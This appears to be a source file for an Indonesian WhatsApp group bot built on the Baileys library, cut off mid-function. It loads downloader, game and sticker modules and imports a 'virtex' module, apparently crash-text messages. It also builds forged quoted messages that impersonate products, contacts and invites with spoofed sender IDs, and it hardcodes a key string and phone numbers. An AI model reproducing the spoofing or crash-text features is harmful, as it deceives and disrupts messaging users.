const {
	WAConnection,
	MessageType,
	Presence,
	MessageOptions,
	Mimetype,
	WALocationMessage,
	WA_MESSAGE_STUB_TYPES,
	WA_DEFAULT_EPHEMERAL,
	ReconnectMode,
	ProxyAgent,
	ChatModification,
	GroupSettingChange,
	waChatKey,
	mentionedJid,
	processTime,
	Browsers,
} = require("@adiwajshing/baileys")
const moment = require(
	"moment-timezone")
const simple = require(
	'./XNXX1/simple.js')
const speed = require('performance-now')
const {
	spawn,
	exec,
	execSync
} = require("child_process")
const ffmpeg = require('fluent-ffmpeg')
const twitterGetUrl = require(
	"twitter-url-direct")
const googleImage = require('g-i-s')
const brainly = require(
	'brainly-scraper')
const fetch = require('node-fetch');
const request = require('request');
const yts = require('yt-search')
const crypto = require('crypto')
const ms = require('parse-ms')
const toMs = require('ms')
const axios = require("axios")
const fs = require("fs-extra")
const util = require('util')
const got = require("got");
const hx = require('hxz-api')
const qrcodes = require('qrcode');
const imgbb = require('imgbb-uploader');
const os = require('os');
const {
	virtex,
	vipi
} = require('./XNXX1/virtex.js')
const Mfake = fs.readFileSync(
	'./XNXXs2/ppk2.jpg')
const Mthumb = fs.readFileSync(
	'./XNXXs2/ppk2.jpg')
const timeWib = moment.tz(
	'Asia/Jakarta').format('DD/MM')

// stickwm
const Exif = require('./XNXX1/exif');
const exif = new Exif();

const {
	downloadMenu,
	infoMenu,
	gameMenu,
	groupMenu,
	funMenu,
	wibuMenu,
	ownerMenu,
	stickerMenu,
	otherMenu,
	rulesBot,
	islamMenu,
	sertiMenu,
	ceritaMenu,
	makerMenu,
	dewasaMenu,
	toolsMenu
} = require('./XNXX5/help.js')
const {
	getBuffer,
	getGroupAdmins,
	getRandom,
	runtime,
	sleep
} = require('./XNXX1/myfunc')
const {
	fetchJson,
	getBase64,
	kyun,
	createExif
} = require('./XNXX1/fetch')
const {
	color,
	bgcolor
} = require('./XNXX1/color')
const {
	mess
} = require('./XNXX5/mess')
const cheerio = require("cheerio")
const {
	pinterest
} = require('./XNXX1/pinterest')
const {
	Toxic
} = require('./XNXX1/Toxic.js')
const {
	AnimeWallpaper
} = require(
	'./node_modules/anime-wallpaper/dist'
);
const wall = new AnimeWallpaper();
const ggs = require('google-it')
const {
	wikiSearch
} = require('./XNXX1/wiki.js')
const {
	EmojiAPI
} = require("emoji-api");
const emoji = new EmojiAPI();
const {
	herolist
} = require('./XNXX1/herolist.js')

const {
	Tiktokdl
} = require('./XNXX1/tiktok.js')
const {
	herodetails
} = require('./XNXX1/herodetail.js')
const anime = require(
	'@freezegold/anime.js');
const {
	cmdadd
} = require('./XNXX1/totalcmd.js')
const {
	isLimit,
	limitAdd,
	getLimit,
	giveLimit,
	addBalance,
	kurangBalance,
	getBalance,
	isGame,
	gameAdd,
	givegame,
	cekGLimit
} = require("./XNXX1/limit");
const {
	yta,
	ytv,
	igdl,
	upload,
	formatDate
} = require('./XNXX1/ytdl')
const {
	uptotele,
	uploadFile,
	RESTfulAPI,
	uploadImages
} = require('./XNXX1/uploadimage')
//const { isGame, gameAdd, givegame, cekGLimit } = require("./XNXX1/limit");
const {
	onGoing,
	dadu,
	asupan
} = require("./XNXX1/otakudesu.js")
const {
	mediafireDl
} = require('./XNXX1/mediafire.js')
const {
	addCommands,
	checkCommands,
	deleteCommands
} = require('./XNXX1/autoresp')
const {
	webp2gifFile,
	igDownloader,
	TiktokDownloader
} = require("./XNXX1/gif.js")
const {
	y2mateA,
	y2mateV
} = require('./XNXX1/y2mate')
const {
	ythd
} = require('./XNXX1/ytdl')
const premium = require(
	"./XNXX1/premium");
const afk = require("./XNXX1/afk");
const {
	isTicTacToe,
	getPosTic
} = require('./XNXX1/tictactoe')
const tictac = require('./XNXX1/tictac')
const level = require("./XNXX1/level");
const atm = require("./XNXX1/atm");
const _sewa = require("./XNXX1/sewa");



var kuis = false
antivo = false
readG = true
readP = false
autorespon = false

let tictactoe = []
hit_today = []
ky_ttt = []
const setGelud = require(
	'./XNXX1/gameGelud.js')
const game = require("./XNXX1/game");
tttawal = ["0️⃣", "1️⃣", "2️⃣", "3️⃣",
	"4️⃣", "5️⃣", "6️⃣", "7️⃣",
	"8️⃣", "9️⃣"
]
g = "```"
let setiker = JSON.parse(fs
	.readFileSync(
		'./XNXX2/stik.json'))
let imagenye = JSON.parse(fs
	.readFileSync(
		'./XNXX2/image.json'))
let videonye = JSON.parse(fs
	.readFileSync(
		'./XNXX2/video.json'))
let audionye = JSON.parse(fs
	.readFileSync('./XNXX2/vn.json')
)
let fakeimage = fs.readFileSync(
	"./XNXXs2/ppk2.jpg")
let thumb = fs.readFileSync(
	"./XNXXs2/canss.jpg")
let thumb2 = fs.readFileSync(
	"./XNXXs2/ppk2.jpg")
let errorImg =
	'https://i.ibb.co/FBm52Pt/1e0fe6a08b67.jpg'
let setting = JSON.parse(fs
	.readFileSync('./setting.json'))

owner = setting.owner
gamewaktu = setting.gamewaktu
limitCount = setting.limitCount
lolkey = setting.lolkey
dappakey = "ItsMeKo"
botname = setting.botname
waktu = setting.waktu
MSLNT = "•×"
Mslntptk = '```'
fake = 'CHI-BOT WHATSAPP'
ban = []
tp = "```"
// Database
let register = JSON.parse(fs
	.readFileSync(
		'./database/user/register.json'
	))
let welkom = JSON.parse(fs.readFileSync(
	'./database/group/welcome.json'
))
let _premium = JSON.parse(fs
	.readFileSync(
		'./database/user/premium.json'
	));
let _afk = JSON.parse(fs.readFileSync(
	'./database/user/afk.json'));
let _leveling = JSON.parse(fs
	.readFileSync(
		'./database/group/leveling.json'
	))
let _level = JSON.parse(fs.readFileSync(
	'./database/user/level.json'
))
let _uang = JSON.parse(fs.readFileSync(
	'./database/user/uang.json'
))
let glimit = JSON.parse(fs.readFileSync(
	'./database/user/glimit.json'
));
let antilink = JSON.parse(fs
	.readFileSync(
		'./database/group/antilink.json'
	));
let _registered = JSON.parse(fs
	.readFileSync(
		'./database/registered.json'
	))
let mute = JSON.parse(fs.readFileSync(
	'./database/group/mute.json'
));
let _update = JSON.parse(fs
	.readFileSync(
		'./database/bot/update.json'
	))
let sewa = JSON.parse(fs.readFileSync(
	'./database/group/sewa.json'
));
let _scommand = JSON.parse(fs
	.readFileSync(
		'./database/bot/scommand.json'
	))
let balance = JSON.parse(fs
	.readFileSync(
		'./database/balance.json'));
let limit = JSON.parse(fs.readFileSync(
	'./database/user/limit.json'
));
// GAME
let tebakanime = JSON.parse(fs
	.readFileSync(
		'./database/tebakanime.json'
	))
let tebakgambar = JSON.parse(fs
	.readFileSync(
		'./database/tebakgambar.json'
	))
let asahotak = JSON.parse(fs
	.readFileSync(
		'./database/asahotak.json'))
let caklontong = JSON.parse(fs
	.readFileSync(
		'./database/caklontong.json'
	))
let tebaksiapaaku = JSON.parse(fs
	.readFileSync(
		'./database/tebaksiapaaku.json'
	))
let tebakbendera = JSON.parse(fs
	.readFileSync(
		'./database/tebakbendera.json'
	))
let susunkata = JSON.parse(fs
	.readFileSync(
		'./database/susunkata.json')
)
let tebakata = JSON.parse(fs
	.readFileSync(
		'./database/tebakata.json'))
let tebaklirik = JSON.parse(fs
	.readFileSync(
		'./database/tebaklirik.json'
	))
let commandsDB = JSON.parse(fs
	.readFileSync(
		'./database/commands.json'))
let tebakjenaka = JSON.parse(fs
	.readFileSync(
		'./database/tebakjenaka.json'
	))
let tebakimia = JSON.parse(fs
	.readFileSync(
		'./database/tebakimia.json')
)
let kuismath = JSON.parse(fs
	.readFileSync(
		'./database/kuismath.json'))
let tebaklagu = JSON.parse(fs
	.readFileSync(
		'./database/tebaklagu.json')
)
let tebaktebakan = JSON.parse(fs
	.readFileSync(
		'./database/tebaktebakan.json'
	))
let family100 = [];


// Sticker Cmd
const addCmd = (id, command) => {
	const obj = {
		id: id,
		chats: command
	}
	_scommand.push(obj)
	fs.writeFileSync(
		'./database/bot/scommand.json',
		JSON.stringify(
			_scommand))
}
const addATM = (sender) => {
	const obj = {
		id: sender,
		balance: 0
	}
	balance.push(obj)
	fs.writeFileSync(
		'./database/balance.json',
		JSON.stringify(balance))
}

const addKoinUser = (sender,
	amount) => {
	let position = false
	Object.keys(balance).forEach((
		i) => {
		if (balance[i]
			.id === sender
		) {
			position = i
		}
	})
	if (position !== false) {
		balance[position].balance +=
			amount
		fs.writeFileSync(
			'./database/balance.json',
			JSON.stringify(
				balance))
	}
}


const checkATMuser = (sender) => {
	let position = false
	Object.keys(balance).forEach((
		i) => {
		if (balance[i]
			.id === sender
		) {
			position = i
		}
	})
	if (position !== false) {
		return balance[position]
			.balance
	}
}
const confirmATM = (sender, amount) => {
	let position = false
	Object.keys(balance).forEach((
		i) => {
		if (balance[i]
			.id === sender
		) {
			position = i
		}
	})
	if (position !== false) {
		balance[position].balance -=
			amount
		fs.writeFileSync(
			'./database/balance.json',
			JSON.stringify(
				balance))
	}
}

const getCommandPosition = (id) => {
	let position = null
	Object.keys(_scommand).forEach((
		i) => {
		if (_scommand[i]
			.id === id) {
			position = i
		}
	})
	if (position !== null) {
		return position
	}
}

const getCmd = (id) => {
	let position = null
	Object.keys(_scommand).forEach((
		i) => {
		if (_scommand[i]
			.id === id) {
			position = i
		}
	})
	if (position !== null) {
		return _scommand[position]
			.chats
	}
}


const checkSCommand = (id) => {
	let status = false
	Object.keys(_scommand).forEach((
		i) => {
		if (_scommand[i]
			.id === id) {
			status = true
		}
	})
	return status
}
async function faketoko(teks, url_image,
	title, code, price) {
	var punya_wa =
		"0@s.whatsapp.net"
	var ini_buffer =
		await getBuffer(url_image)
	const ini_cstoko = {
		contextInfo: {
			participant: punya_wa,
			remoteJid: 'status@broadcast',
			quotedMessage: {
				productMessage: {
					product: {
						currencyCode: code,
						title: title,
						priceAmount1000: price,
						productImageCount: 1,
						productImage: {
							jpegThumbnail: ini_buffer
						}
					},
					businessOwnerJid: "0@s.whatsapp.net"
				}
			}
		}
	}
	await Maslent.sendMessage(from,
		teks, text, ini_cstoko)
}



module.exports = Maslent = async (
	Maslent, mek) => {
	try {
		if (!mek.hasNewMessage)
			return
		mek = mek.messages
			.all()[0]
		if (!mek.message) return
		if (mek.key && mek.key
			.remoteJid ==
			'status@broadcast')
			return
		if (mek.key.id
			.startsWith(
				'3EB0') && mek
			.key
			.id.length === 12)
			return
		m = simple.smsg(Maslent,
			mek)
		//	global.ky_ttt
		global.blocked
		mek.message = (Object
				.keys(mek
					.message)[
					0] ===
				'ephemeralMessage'
			) ? mek.message
			.ephemeralMessage
			.message : mek
			.message
		const {
			text,
			extendedText,
			contact,
			location,
			liveLocation,
			image,
			video,
			sticker,
			document,
			audio,
			product
		} = MessageType
		const time = moment.tz(
				'Asia/Jakarta')
			.format(
				'DD/MM HH:mm:ss'
			)
		const wib = moment().tz(
				'asia/jakarta')
			.format("hh:mm:ss")
		const wita = moment.tz(
				'asia/makassar')
			.format('hh:mm:ss')
		const wit = moment.tz(
				'asia/jayapura')
			.format('hh:mm:ss')
		const content = JSON
			.stringify(mek
				.message)
		const from = mek.key
			.remoteJid
		const type = Object
			.keys(mek.message)[
				0]
		var pes = (type ===
				'conversation' &&
				mek.message
				.conversation) ?
			mek.message
			.conversation : (
				type ==
				'imageMessage'
			) && mek.message
			.imageMessage
			.caption ? mek
			.message
			.imageMessage
			.caption : (type ==
				'videoMessage'
			) && mek.message
			.videoMessage
			.caption ? mek
			.message
			.videoMessage
			.caption : (type ==
				'extendedTextMessage'
			) && mek.message
			.extendedTextMessage
			.text ? mek.message
			.extendedTextMessage
			.text : ''
		const messagesC = pes
			.slice(0).trim()
		isImage = (type ===
			'imageMessage')
		const cmd = (type ===
				'conversation' &&
				mek.message
				.conversation) ?
			mek.message
			.conversation : (
				type ==
				'imageMessage'
			) && mek.message
			.imageMessage
			.caption ? mek
			.message
			.imageMessage
			.caption : (type ==
				'videoMessage'
			) && mek.message
			.videoMessage
			.caption ? mek
			.message
			.videoMessage
			.caption : (type ==
				'extendedTextMessage'
			) && mek.message
			.extendedTextMessage
			.text ? mek.message
			.extendedTextMessage
			.text : ''.slice(1)
			.trim().split(/ +/)
			.shift()
			.toLowerCase()
		const prefix =
			/^[°•π÷×¶∆£¢€¥®™=|~#%^&.?/\\©^z+*,;]/
			.test(cmd) ? cmd
			.match(
				/^[°•π÷×¶∆£¢€¥®™=|~#%^&.?/\\©^z+*,;]/gi
			) : '!'
		body = (type ===
				'conversation' &&
				mek.message
				.conversation
				.startsWith(
					prefix)) ?
			mek.message
			.conversation : (
				type ==
				'imageMessage'
			) && mek
			.message[type]
			.caption.startsWith(
				prefix) ? mek
			.message[type]
			.caption : (type ==
				'videoMessage'
			) && mek
			.message[type]
			.caption.startsWith(
				prefix) ? mek
			.message[type]
			.caption : (type ==
				'extendedTextMessage'
			) && mek
			.message[type].text
			.startsWith(
				prefix) ? mek
			.message[type]
			.text : (type ==
				'listResponseMessage'
			) && mek
			.message[type]
			.singleSelectReply
			.selectedRowId ? mek
			.message[type]
			.singleSelectReply
			.selectedRowId : (
				type ==
				'buttonsResponseMessage'
			) && mek
			.message[type]
			.selectedButtonId ?
			mek.message[type]
			.selectedButtonId :
			(type ==
				'stickerMessage'
			) && (getCmd(mek
					.message[
						type]
					.fileSha256
					.toString(
						'base64'
					)) !==
				null && getCmd(
					mek.message[
						type]
					.fileSha256
					.toString(
						'base64'
					)) !==
				undefined) ?
			getCmd(mek.message[
					type]
				.fileSha256
				.toString(
					'base64')) :
			""
		budy = (type ===
				'conversation'
			) ? mek.message
			.conversation : (
				type ===
				'extendedTextMessage'
			) ? mek.message
			.extendedTextMessage
			.text : ''
		const command = body
			.slice(1).trim()
			.split(/ +/).shift()
			.toLowerCase()
		const args = body.trim()
			.split(/ +/).slice(
				1)
		hit_today.push(command)
		const arg = body
			.substring(body
				.indexOf(' ') +
				1)
		const ar = args.map((
				v) => v
			.toLowerCase())
		const argz = body.trim()
			.split(/ +/).slice(
				1)
		const isCmd = body
			.startsWith(prefix)
		if (isCmd) cmdadd()
		const totalhit = JSON
			.parse(fs
				.readFileSync(
					'./database/totalcmd.json'
				))[0]
			.totalcmd
		const q = args.join(' ')


		const botNumber =
			Maslent.user.jid
		const ownerNumber =
			setting.ownerNumber
		const ownerName =
			setting.ownerName
		const botName = setting
			.botName
		const isGroup = from
			.endsWith('@g.us')
		/*	let sender = isGroup ? mek.participant : mek.key.remoteJid
			let senderr = mek.key.fromMe ? Maslent.user.jid : mek.key.remoteJid.endsWith('@g.us') ? mek.participant : mek.key.remoteJid*/
		const sender = mek.key
			.fromMe ?
			Maslent.user.jid :
			isGroup ?
			mek.participant :
			mek.key.remoteJid;
		let senderr = mek.key
			.fromMe ?
			Maslent.user.jid :
			mek.key.remoteJid
			.endsWith("@g.us") ?
			mek.participant :
			mek.key.remoteJid;
		const totalchat =
			await Maslent.chats
			.all()
		const groupMetadata =
			isGroup ?
			await Maslent
			.groupMetadata(
				from) : ''
		const groupName =
			isGroup ?
			groupMetadata
			.subject : ''
		const groupId =
			isGroup ?
			groupMetadata.jid :
			''
		const groupMembers =
			isGroup ?
			groupMetadata
			.participants : ''
		const groupDesc =
			isGroup ?
			groupMetadata.desc :
			''
		const groupOwner =
			isGroup ?
			groupMetadata
			.owner : ''
		const groupAdmins =
			isGroup ?
			getGroupAdmins(
				groupMembers) :
			''
		const isBotGroupAdmins =
			groupAdmins
			.includes(
				botNumber) ||
			false
		const isGroupAdmins =
			groupAdmins
			.includes(sender) ||
			false
		const conts = mek.key
			.fromMe ? Maslent
			.user.jid : Maslent
			.contacts[sender] ||
			{
				notify: jid
					.replace(
						/@.+/,
						'')
			}
		const pushname = mek.key
			.fromMe ? Maslent
			.user.name : conts
			.notify || conts
			.vname || conts
			.name || '-'
		const mentionByTag =
			type ==
			"extendedTextMessage" &&
			mek.message
			.extendedTextMessage
			.contextInfo !=
			null ? mek.message
			.extendedTextMessage
			.contextInfo
			.mentionedJid : []
		const mentionByreply =
			type ==
			"extendedTextMessage" &&
			mek.message
			.extendedTextMessage
			.contextInfo !=
			null ? mek.message
			.extendedTextMessage
			.contextInfo
			.participant || "" :
			""
		const mention = typeof(
				mentionByTag) ==
			'string' ? [
				mentionByTag
			] : mentionByTag
		mention != undefined ?
			mention.push(
				mentionByreply
			) : []
		const mentionUser =
			mention !=
			undefined ? mention
			.filter(n => n) : []

		const isOwner =
			ownerNumber
			.includes(senderr)
		//    const isPremium = premium.checkPremiumUser(sender, _premium)
		const isPremium =
			isOwner ? true :
			premium
			.checkPremiumUser(
				sender, _premium
			)
		//   const gcount = setting.gcount
		const gcount =
			isPremium ? setting
			.gcount.prem :
			setting.gcount.user
		const isSewa = _sewa
			.checkSewaGroup(
				from, sewa)
		const isAfkOn = afk
			.checkAfkUser(
				sender, _afk)
		const senderNumber =
			sender.split("@")[0]
		const isLevelingOn =
			isGroup ? _leveling
			.includes(from) :
			false
		const isMuted =
			isGroup ? mute
			.includes(from) :
			false
		const isAntiLink =
			isGroup ? antilink
			.includes(from) :
			false
		const isWelkom =
			isGroup ? welkom
			.includes(from) :
			false

		// here button function
		selectedButton = (
				type ==
				'buttonsResponseMessage'
			) ? mek.message
			.buttonsResponseMessage
			.selectedButtonId :
			''

		responseButton = (
				type ==
				'listResponseMessage'
			) ? mek.message
			.listResponseMessage
			.title : ''

		// const gcount = setting.gcount

		const listmsg = (from,
			title, desc,
			list
		) => { // ngeread nya pake rowsId, jadi command nya ga keliatan
			let po = Maslent
				.prepareMessageFromContent(
					from, {
						"listMessage": {
							"title": title,
							"description": desc,
							"buttonText": "Pilih Disini",
							"footerText": "Copyright By ©chi",
							"listType": "SINGLE_SELECT",
							"sections": list
						}
					}, {})
			return Maslent
				.relayWAMessage(
					po, {
						waitForAck: true
					})
		}

		const isUrl = (url) => {
			return url
				.match(
					new RegExp(
						/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/,
						'gi'
					))
		}

		function monospace(
			string) {
			return '```' +
				string + '```'
		}

		function jsonformat(
			string) {
			return JSON
				.stringify(
					string,
					null, 2)
		}

		function randomNomor(
			angka) {
			return Math.floor(
				Math
				.random() *
				angka) + 1
		}
		const reply = (
			teks) => {
			Maslent
				.sendMessage(
					from,
					teks,
					text, {
						quoted: mek,
						thumbnail: fakeimage
					})
		}
		const sendMess = (hehe,
			teks) => {
			Maslent
				.sendMessage(
					hehe,
					teks,
					text)
		}
		const mentions = (teks,
			memberr, id
		) => {
			(id == null ||
				id ==
				undefined ||
				id == false
			) ? Maslent
				.sendMessage(
					from, {
						text: teks
							.trim(),
						jpegThumbnail: fs
							.readFileSync(
								'./XNXXs2/ppk2.jpg'
							)
					},
					extendedText, {
						sendEphemeral: true,
						contextInfo: {
							"mentionedJid": memberr
						}
					}):
				Maslent
				.sendMessage(
					from, {
						text: teks
							.trim(),
						jpegThumbnail: fs
							.readFileSync(
								'./XNXXs2/ppk2.jpg'
							)
					},
					extendedText, {
						sendEphemeral: true,
						quoted: mek,
						contextInfo: {
							"mentionedJid": memberr
						}
					})
		}
		const sendText = (from,
			text) => {
			Maslent
				.sendMessage(
					from,
					text,
					MessageType
					.text)
		}
		const textImg = (
			teks) => {
			return Maslent
				.sendMessage(
					from,
					teks,
					text, {
						quoted: mek,
						thumbnail: fs
							.readFileSync(
								'./XNXXs2/ppk2.jpg'
							)
					})
		}
		const freply = {
			key: {
				fromMe: false,
				participant: `0@s.whatsapp.net`,
				...(from ? {
					remoteJid: '16504228206@s.whatsapp.net'
				} : {})
			},
			message: {
				"contactMessage": {
					"displayName": `${pushname}`,
					"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${senderr.split('@')[0]}:${senderr.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
					"jpegThumbnail": fs
						.readFileSync(
							'./XNXXs2/ppk.jpg'
						)
				}
			}
		}
		const math = (teks) => {
			return Math
				.floor(teks)
		}
		const kick = function(
			from, orangnya
		) {
			for (let i of
					orangnya) {
				Maslent
					.groupRemove(
						from,
						[i])
			}
		}
		const ftoko = {
			key: {
				fromMe: false,
				participant: `0@s.whatsapp.net`,
				...(from ? {
					remoteJid: "16505434800@s.whatsapp.net"
				} : {})
			},
			message: {
				"productMessage": {
					"product": {
						"productImage": {
							"mimetype": "image/jpeg",
							"jpegThumbnail": fs
								.readFileSync(
									`./XNXXs2/canss.jpg`
								)
						},
						"title": fake,
						"description": "Iqbalzz`",
						"currencyCode": "IDR",
						"priceAmount1000": "9999999999",
						"retailerId": "Iqbalzz`",
						"productImageCount": 1
					},
					"businessOwnerJid": `0@s.whatsapp.net`
				}
			}
		}
		const fkontak = {
			key: {
				fromMe: false,
				participant: `0@s.whatsapp.net`,
				...(from ? {
					remoteJid: `0@s.whatsapp.net`
				} : {})
			},
			message: {
				'contactMessage': {
					'displayName': `${pushname}`,
					'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
					'jpegThumbnail': fs
						.readFileSync(
							'./XNXXs2/canss.jpg'
						)
				}
			}
		}
		const fsticker = {
			key: {
				fromMe: false,
				participant: `0@s.whatsapp.net`,
				...(from ? {
					remoteJid: "16505434800@s.whatsapp.net"
				} : {})
			},
			"message": {
				"stickerMessage": {
					"url": "https://mmg.whatsapp.net/d/f/Am6FBfNf-E2f1VoGBXkPaNAy7L6Tw_HMavKrHEt48QM4.enc",
					"fileSha256": "Yfj8SW7liSEnDakvyVlXVZQ1LJBC9idn09X7KHe8HTc=",
					"fileEncSha256": "F854aUrzgAkBTOVULpne4oSIi6S04Jo56pjZEo+p+9U=",
					"mediaKey": "Z3nA2asclAAwWHngNO/vJ81qxOE2/0gkEnXak+NxPV4=",
					"mimetype": "image/webp",
					"height": 64,
					"width": 64,
					"directPath": "/v/t62.15575-24/12097272_1193895144391295_8973688483514349023_n.enc?ccb=11-4&oh=5a9d7147627a8355569f1a641b9ebee3&oe=60C65E73",
					"fileLength": "7186",
					"mediaKeyTimestamp": "1622815545",
					"isAnimated": false
				}
			}
		}
		const fvn = {
			key: {
				fromMe: false,
				participant: `0@s.whatsapp.net`,
				...(from ? {
					remoteJid: "16505434800@s.whatsapp.net"
				} : {})
			},
			message: {
				"audioMessage": {
					"mimetype": "audio/ogg; codecs=opus",
					"seconds": "9999999",
					"ptt": "true"
				}
			}
		}
		const floc2 = {
			key: {
				"fromMe": false,
				"participant": `0@s.whatsapp.net`,
				"remoteJid": "6289530863358-1621036495@g.us"
			},
			message: {
				"liveLocationMessage": {
					"caption": `${pushname}`,
					"name": `${prefix+command}`
				}
			}
		}
		const meki = {
			key: {
				fromMe: false,
				participant: `0@s.whatsapp.net`,
				...(from ? {
					remoteJid: "16505434800@s.whatsapp.net"
				} : {})
			},
			message: {
				orderMessage: {
					itemCount: 1,
					status: 1,
					surface: 1,
					message: `${fake}`,
					orderTitle: 'Bang',
					thumbnail: fs
						.readFileSync(
							'./XNXXs2/canss.jpg'
						),
					sellerJid: '0@s.whatsapp.net'
				}
			}
		}
		const mekeo = {
			key: {
				fromMe: false,
				participant: `0@s.whatsapp.net`,
				...(from ? {
					remoteJid: "6289643739077-1613049930@g.us"
				} : {})
			},
			message: {
				"videoMessage": {
					"title": "hallo bang",
					"h": `Hmm`,
					'seconds': '99999999999',
					'caption': `${fake}`,
					'jpegThumbnail': fs
						.readFileSync(
							'./XNXXs2/canss.jpg'
						)
				}
			}
		}
		const fgc = {
			key: {
				"fromMe": false,
				"participant": "0@s.whatsapp.net",
				"remoteJid": "0@s.whatsapp.net"
			},
			"message": {
				"groupInviteMessage": {
					"groupJid": "62895619083555-1616169743@g.us",
					"inviteCode": "mememteeeekkeke",
					"groupName": "P",
					"caption": `${fake}`,
					'jpegThumbnail': fs
						.readFileSync(
							'./XNXXs2/canss.jpg'
						)
				}
			}
		}
		const fgif = {
			key: {
				fromMe: false,
				participant: `62895619083555@s.whatsapp.net`,
				...(from ? {
					remoteJid: "6289643739077-1613049930@g.us"
				} : {})
			},
			message: {
				"videoMessage": {
					"title": "hallo bang",
					"h": `Hmm`,
					'seconds': '99999',
					'gifPlayback': 'true',
					'caption': `${fake}`,
					'jpegThumbnail': fs
						.readFileSync(
							'./XNXXs2/canss.jpg'
						)
				}
			}
		}
		const floc = {
			key: {
				participant: '0@s.whatsapp.net'
			},
			message: {
				locationMessage: {
					name: 'Russia',
					jpegThumbnail: fs
						.readFileSync(
							'./XNXXs2/canss.jpg'
						)
				}
			}
		}
		const fdoc = {
			key: {
				participant: '0@s.whatsapp.net'
			},
			message: {
				documentMessage: {
					title: 'Iqbalzz',
					jpegThumbnail: fs
						.readFileSync(
							'./XNXXs2/canss.jpg'
						)
				}
			}
		}
		if (isTicTacToe(from,
				tictactoe))
			tictac(budy, prefix,
				tictactoe, from,
				sender, reply,
				mentions,
				addBalance,
				balance)

		const kickMember =
			async (id,
				target = []
			) => {
				let group =
					await Maslent
					.groupMetadata(
						id)
				let owner =
					group
					.owner
					.replace(
						"c.us",
						"s.whatsapp.net"
					)
				let me =
					Maslent
					.user
					.jid
				for (i of
					target
				) {
					if (!i
						.includes(
							me
						) &&
						!i
						.includes(
							owner
						)
					) {
						await Maslent
							.groupRemove(
								to,
								[
									i
								]
							)
					} else {
						await Maslent
							.sendMessage(
								id,
								"Not Premited!",
								"conversation"
							)
						break
					}
				}
			}
		const add = function(
			from, orangnya
		) {
			Maslent
				.groupAdd(
					from,
					orangnya
				)
		}
		const sendKontak = (
			from, nomor,
			nama, org = ""
		) => {
			const vcard =
				'BEGIN:VCARD\n' +
				'VERSION:3.0\n' +
				'FN:' +
				nama +
				'\n' +
				'ORG:' +
				org + '\n' +
				'TEL;type=CELL;type=VOICE;waid=' +
				nomor +
				':+' +
				nomor +
				'\n' +
				'END:VCARD'
			Maslent
				.sendMessage(
					from, {
						displayname: nama,
						vcard: vcard
					},
					MessageType
					.contact, {
						quoted: mek
					})
		}
		const hideTag =
			async function(from,
				text) {
				let anu =
					await Maslent
					.groupMetadata(
						from
					)
				let members =
					anu
					.participants
				let ane = []
				for (let i of
						members) {
					ane.push(
						i
						.jid
					)
				}
				Maslent
					.sendMessage(
						from, {
							text: text,
							jpegThumbnail: fs
								.readFileSync(
									'XNXXs2/ppk.jpg'
								)
						},
						'extendedTextMessage', {
							contextInfo: {
								"mentionedJid": ane
							}
						})
			}
		const sendWebp = async (
			to, url
		) => {
			var names =
				Date
				.now() /
				10000;
			var download =
				function(
					uri,
					filename,
					callback
				) {
					request
						.head(
							uri,
							function(
								err,
								res,
								body
							) {
								request
									(
										uri
									)
									.pipe(
										fs
										.createWriteStream(
											filename
										)
									)
									.on('close',
										callback
									);
							}
						);
				};
			download(
				url,
				'./sticker' +
				names +
				'.png',
				async function() {
					console
						.log(
							'selesai'
						);
					let filess =
						'./sticker' +
						names +
						'.png'
					let asw =
						'./sticker' +
						names +
						'.webp'
					exec(`ffmpeg -i ${filess} -vf "scale=512:512:force_original_aspect_ratio=increase,fps=40, crop=512:512" ${asw}`,
						(
							err
						) => {
							fs.unlinkSync(
								filess
							)
							if (
								err
							)
								return reply(
									`${err}`
								)
							exec(`webpmux -set exif ./XNXXs1/data.exif ${asw} -o ${asw}`,
								async (
									error
								) => {
									if (
										error
									)
										return reply(
											`${error}`
										)
									Maslent
										.sendMessage(
											from,
											fs
											.readFileSync(
												asw
											),
											sticker, {
												sendEphemeral: true,
												quoted: mek
											}
										)
									fs.unlinkSync(
										asw
									)
								});
						}
					);
				});
		}
		const sendMediaURL =
			async (to, url,
				text = "",
				mids = []
			) => {
				if (mids
					.length >
					0) {
					text =
						normalizeMention(
							to,
							text,
							mids
						)
				}
				const fn =
					Date
					.now() /
					10000;
				const
					filename =
					fn
					.toString()
				let mime =
					""
				var download =
					function(
						uri,
						filename,
						callback
					) {
						request
							.head(
								uri,
								function(
									err,
									res,
									body
								) {
									mime =
										res
										.headers[
											'content-type'
										]
									request
										(
											uri
										)
										.pipe(
											fs
											.createWriteStream(
												filename
											)
										)
										.on('close',
											callback
										);
								}
							);
					};
				download(
					url,
					filename,
					async function() {
						console
							.log(
								'done'
							);
						let media =
							fs
							.readFileSync(
								filename
							)
						let type =
							mime
							.split(
								"/"
							)[
								0
							] +
							"Message"
						if (mime ===
							"image/gif"
						) {
							type =
								MessageType
								.video
							mime =
								Mimetype
								.gif
						}
						if (mime
							.split(
								"/"
							)[
								0
							] ===
							"audio"
						) {
							mime =
								Mimetype
								.mp4Audio
						}
						Maslent
							.sendMessage(
								to,
								media,
								type, {
									quoted: mek,
									mimetype: mime,
									caption: text,
									thumbnail: Buffer
										.alloc(
											0
										),
									contextInfo: {
										"mentionedJid": mids
									}
								}
							)

						fs.unlinkSync(
							filename
						)
					});
			}
		const sendFileFromUrl =
			async (link, type,
				options
			) => {
				hasil =
					await getBuffer(
						link
					)
				Maslent
					.sendMessage(
						from,
						hasil,
						type,
						options
					)
					.catch(
						e => {
							fetch
								(
									link
								)
								.then(
									(
										hasil
									) => {
										Maslent
											.sendMessage(
												from,
												hasil,
												type,
												options
											)
											.catch(
												e => {
													Maslent
														.sendMessage(
															from, {
																url: link
															},
															type,
															options
														)
														.catch(
															e => {
																reply
																	(
																		'_[ ! ] Error Gagal Dalam Mendownload Dan Mengirim Media_'
																	)
																console
																	.log(
																		e
																	)
															}
														)
												}
											)
									}
								)
						})
			}
		const
			sendStickerFromUrl =
			async (to, url) => {
				var names =
					Date
					.now() /
					10000;
				var download =
					function(
						uri,
						filename,
						callback
					) {
						request
							.head(
								uri,
								function(
									err,
